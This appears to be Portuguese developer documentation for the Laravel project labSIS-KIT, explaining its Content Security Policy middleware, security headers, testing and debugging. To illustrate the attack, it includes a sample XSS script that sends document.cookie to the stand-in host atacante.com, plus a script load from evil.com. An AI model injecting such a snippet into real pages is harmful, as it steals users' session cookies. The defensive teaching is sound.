+Content Security Policy (CSP) é uma camada adicional de segurança que ajuda a detectar e mitigar certos tipos de ataques, incluindo Cross-Site Scripting (XSS) e ataques de injeção de dados. O CSP funciona definindo de quais fontes o navegador pode carregar recursos como scripts, estilos, imagens e outros conteúdos.
+
+### Por que CSP é importante?
+
+#### 1. **Proteção contra XSS (Cross-Site Scripting)**
+
+XSS é um dos ataques mais comuns na web. Atacantes injetam código JavaScript malicioso em páginas web que depois é executado no navegador de outros usuários.
+
+**Exemplo de ataque XSS:**
+
+```html
+<!-- Atacante injeta esse código em um comentário ou formulário -->
+<script>
+    // Roubar cookies de autenticação
+    fetch("https://atacante.com/steal?cookie=" + document.cookie);
+<\/script>
+```
+
+**Como CSP protege:**
+Com CSP, você define explicitamente de onde scripts podem vir. Se um script malicioso for injetado, o navegador bloqueará sua execução.
+
+```
+Content-Security-Policy: script-src 'self'
+```
+
+☝️ Permite apenas scripts do próprio domínio, bloqueando qualquer script injetado.
+
+#### 2. **Proteção contra Clickjacking**
+
+Clickjacking é quando um atacante engana o usuário a clicar em algo diferente do que está vendo, geralmente incorporando seu site em um iframe invisível.
+
+**Como CSP protege:**
+
+```
+Content-Security-Policy: frame-ancestors 'self'
+```
+
+☝️ Impede que seu site seja incorporado em iframes de outros domínios.
+
+#### 3. **Proteção contra Data Injection**
+
+Atacantes podem tentar manipular URLs e formulários para realizar ataques.
+
+**Como CSP protege:**
+
+```
+Content-Security-Policy:
+  base-uri 'self';
+  form-action 'self'
+```
+
+☝️ Restringe onde formulários podem ser enviados e qual base URL pode ser usada.
+
+---
+
+## Implementação no labSIS-KIT
+
+### Localização
+
+O CSP está implementado no middleware `EnsureSecurityHeaders`:
+
+📄 [`app/Http/Middleware/EnsureSecurityHeaders.php`](/app/Http/Middleware/EnsureSecurityHeaders.php)
+
+### Arquitetura da Implementação
+
+```mermaid
+graph TD
+    A[Requisição HTTP] --> B{Rota começa com /admin ou /user?}
+    B -->|Sim| C[Não aplica CSP]
+    B -->|Não| D{Ambiente Local?}
+    D -->|Sim| E[Política CSP Development]
+    D -->|Não| F[Política CSP Production]
+    C --> G[Adiciona Headers Básicos]
+    E --> G
+    F --> G
+    G --> H[Resposta HTTP]
+
+    style E fill:#90EE90
+    style F fill:#FFB6C1
+    style C fill:#FFE4B5
+```
+
+### Exclusão de Painéis Administrativos
+
+O CSP **não é aplicado** nos painéis `/admin` e `/user` porque o Filament gerencia suas próprias políticas de segurança. O CSP é aplicado apenas em:
+
+-   ✅ **AuthPanel** (`/`, `/login`, `/register`)
+-   ✅ **Rotas públicas** (home, landing page)
+
+```php
+// Verifica se a rota NÃO é admin ou user
+if (! $request->is('admin*') && ! $request->is('user*')) {
+    // Aplica CSP
+}
+```
+
+### Políticas CSP Configuradas
+
+#### 🔧 Ambiente de Desenvolvimento
+
+Configurado para compatibilidade total com Vite (Hot Module Replacement):
+
+```
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' 'unsafe-eval' http://localhost:5173;
+  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com http://localhost:5173;
+  img-src 'self' data: blob: {domínio-s3};
+  font-src 'self' https://fonts.gstatic.com;
+  connect-src 'self' ws://localhost:5173 http://localhost:5173;
+  media-src 'self' {domínio-s3};
+```
+
+**Recursos permitidos:**
+
+-   ✅ Scripts do próprio site e Vite dev server
+-   ✅ WebSocket para HMR (Hot Module Replacement)
+-   ✅ Google Fonts
+-   ✅ Imagens de S3/MinIO
+
+#### 🚀 Ambiente de Produção
+
+Mais restritivo, sem permissões de desenvolvimento:
+
+```
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' 'unsafe-eval';
+  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+  img-src 'self' data: blob: {domínio-s3} https://*.r2.cloudflarestorage.com;
+  font-src 'self' https://fonts.gstatic.com;
+  connect-src 'self';
+  media-src 'self' {domínio-s3} https://*.r2.cloudflarestorage.com;
+  frame-ancestors 'self';
+  base-uri 'self';
+  form-action 'self';
+```
+
+**Recursos permitidos:**
+
+-   ✅ Scripts e estilos do próprio site
+-   ✅ Google Fonts
+-   ✅ Imagens de S3/MinIO ou Cloudflare R2
+-   ✅ Proteções adicionais contra clickjacking e manipulação de formulários
+
+### Diretivas CSP Explicadas
+
+| Diretiva          | Função                                                       | Exemplo                               |
+| ----------------- | ------------------------------------------------------------ | ------------------------------------- |
+| `default-src`     | Define fonte padrão para todos os recursos                   | `'self'` = apenas do próprio domínio  |
+| `script-src`      | Define de onde scripts podem ser carregados                  | `'self' http://localhost:5173`        |
+| `style-src`       | Define de onde estilos podem ser carregados                  | `'self' https://fonts.googleapis.com` |
+| `img-src`         | Define de onde imagens podem ser carregadas                  | `'self' data: blob:`                  |
+| `font-src`        | Define de onde fontes podem ser carregadas                   | `https://fonts.gstatic.com`           |
+| `connect-src`     | Define para onde requisições AJAX/WebSocket podem ser feitas | `'self' ws://localhost:5173`          |
+| `media-src`       | Define de onde áudio/vídeo podem ser carregados              | `'self'`                              |
+| `frame-ancestors` | Define quem pode incorporar o site em iframe                 | `'self'` = só o próprio site          |
+| `base-uri`        | Restringe URLs que podem ser usadas na tag `<base>`          | `'self'`                              |
+| `form-action`     | Restringe para onde formulários podem enviar dados           | `'self'`                              |
+
+### Valores Especiais
+
+| Valor             | Significado                                            |
+| ----------------- | ------------------------------------------------------ |
+| `'self'`          | Mesmo domínio (protocolo, host e porta)                |
+| `'unsafe-inline'` | Permite scripts/estilos inline (⚠️ menos seguro)       |
+| `'unsafe-eval'`   | Permite `eval()` e funções similares (⚠️ menos seguro) |
+| `data:`           | Permite URLs data: (ex: `data:image/png;base64,...`)   |
+| `blob:`           | Permite URLs blob: (ex: arquivos criados em memória)   |
+| `https:`          | Permite HTTPS de qualquer domínio                      |
+| `*.dominio.com`   | Permite todos os subdomínios                           |
+
+---
+
+## Headers de Segurança Adicionais
+
+Além do CSP, o middleware implementa outros headers importantes:
+
+### X-Frame-Options
+
+```
+X-Frame-Options: SAMEORIGIN
+```
+
+**Proteção:** Impede que o site seja carregado em iframes de outros domínios (defesa contra clickjacking).
+
+### X-Content-Type-Options
+
+```
+X-Content-Type-Options: nosniff
+```
+
+**Proteção:** Impede que o navegador "adivinhe" o tipo MIME de arquivos, forçando respeitar o header `Content-Type`.
+
+### X-XSS-Protection
+
+```
+X-XSS-Protection: 1; mode=block
+```
+
+**Proteção:** Ativa proteção XSS do navegador (legacy, CSP é mais moderno).
+
+### Referrer-Policy
+
+```
+Referrer-Policy: strict-origin-when-cross-origin
+```
+
+**Proteção:** Controla quais informações de referência são enviadas em requisições.
+
+### Strict-Transport-Security (HSTS)
+
+```
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+```
+
+**Proteção:** Força o navegador a sempre usar HTTPS (válido por 1 ano).
+
+---
+
+## Testando a Implementação
+
+### 1. Verificar Headers HTTP
+
+```bash
+# Ver todos os headers de segurança
+curl -I http://localhost
+
+# Buscar especificamente CSP
+curl -I http://localhost | grep Content-Security-Policy
+```
+
+### 2. Verificar no Navegador
+
+1. Acesse a aplicação (ex: `http://localhost/login`)
+2. Abra DevTools (F12)
+3. Vá para **Network** > Clique na primeira requisição
+4. Veja a aba **Headers** > **Response Headers**
+5. Confirme a presença de `Content-Security-Policy`
+
+### 3. Testar Violações CSP
+
+Para testar se o CSP está funcionando, tente injetar um script malicioso:
+
+```html
+<!-- Isso deve ser BLOQUEADO pelo CSP -->
+<script src="https://evil.com/malicious.js"><\/script>
+```
+
+O navegador bloqueará e mostrará um erro no console:
+
+```
+Refused to load the script 'https://evil.com/malicious.js' because it violates
+the following Content Security Policy directive: "script-src 'self' ..."
+```
+
+---
+
+## Configuração de Storage S3/MinIO
+
+O CSP detecta automaticamente o domínio de storage configurado:
+
+```php
+$filesDomain = config('filesystems.disks.s3.endpoint',
+                      config('filesystems.disks.s3.url'));
+```
+
+**Variáveis de ambiente necessárias:**
+
+```env
+# .env
+AWS_ENDPOINT=http://minio:9000          # Local
+AWS_URL=http://localhost:9000           # Dev
+
+# OU em produção:
+AWS_ENDPOINT=https://s3.us-east-1.amazonaws.com
+AWS_URL=https://cdn.seudominio.com
+```
+
+---
+
+## Nonce para Scripts Seguros
+
+O middleware gera um **nonce** (número usado uma vez) para cada requisição:
+
+```php
+$nonce = base64_encode(random_bytes(16));
+app()->instance('csp-nonce', $nonce);
+```
+
+**Como usar em views Blade:**
+
+```blade
+<script nonce="{{ app('csp-nonce') }}">
+    // Código JavaScript inline seguro
+    console.log('Este script é permitido pelo CSP');
+<\/script>
+```
+
+> **Nota:** Atualmente o projeto usa `'unsafe-inline'`, o que permite scripts inline sem nonce. Para máxima segurança, considere remover `'unsafe-inline'` e usar nonces em todos os scripts.
+
+---
+
+## Melhorias Futuras
+
+### 1. Remover `'unsafe-inline'`
+
+**Atual:**
+
+```
+script-src 'self' 'unsafe-inline' 'unsafe-eval'
+```
+
+**Mais seguro:**
+
+```
+script-src 'self' 'nonce-{random}'
+```
+
+Exige adicionar nonces em todos os scripts inline.
+
+### 2. Remover `'unsafe-eval'`
+
+Evite uso de `eval()`, `new Function()`, etc. no código JavaScript.
+
+### 3. Implementar Relatórios CSP
+
+```
+Content-Security-Policy-Report-Only: ... ; report-uri /csp-violation-report
+```
+
+Permite testar políticas sem bloquear recursos, apenas reportando violações.
+
+### 4. Upgrade Insecure Requests
+
+```
+Content-Security-Policy: upgrade-insecure-requests
+```
+
+Força http:// a se tornar https:// automaticamente.
+
+---
+
+## Debugging de Problemas CSP
+
+### Sintoma: Recursos bloqueados
+
+**Console do navegador:**
+
+```
+Refused to load the image 'https://exemplo.com/imagem.jpg' because it violates
+the following Content Security Policy directive: "img-src 'self'"
+```
+
+**Solução:**
+Adicione o domínio na diretiva apropriada:
+
+```php
+"img-src 'self' https://exemplo.com"
+```
+
+### Sintoma: Vite HMR não funciona
+
+**Problema:** WebSocket do Vite é bloqueado.
+
+**Solução:** Certifique-se de estar em ambiente local e que `connect-src` inclui:
+
+```php
+"connect-src 'self' ws://localhost:5173 http://localhost:5173"
+```
+
+### Sintoma: Google Fonts não carregam
+
+**Problema:** Fontes externas bloqueadas.
+
+**Solução:**
+
+```php
+"font-src 'self' https://fonts.gstatic.com",
+"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com"
+```
+
+---
+
+## Referências
+
+-   [MDN - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+-   [CSP Evaluator - Google](https://csp-evaluator.withgoogle.com/)
+-   [OWASP - Content Security Policy](https://owasp.org/www-community/controls/Content_Security_Policy)
+-   [Laravel Security Best Practices](https://laravel.com/docs/12.x/security)
+
+---
+
+## Conclusão
+
+O CSP implementado no labSIS-KIT fornece múltiplas camadas de proteção:
+
+✅ Bloqueia scripts maliciosos (XSS)  
+✅ Previne clickjacking  
+✅ Restringe fontes de recursos  
+✅ Compatível com Vite em desenvolvimento  
+✅ Não interfere com Filament Admin  
+✅ Suporte a storage S3/MinIO/R2
+
+Esta implementação equilibra **segurança robusta** com **experiência de desenvolvimento fluida**, mantendo o projeto protegido contra os ataques web mais comuns.
+</script>
+<script src="../assets/labsis-manual.js"></script>
+</body>
+</html>
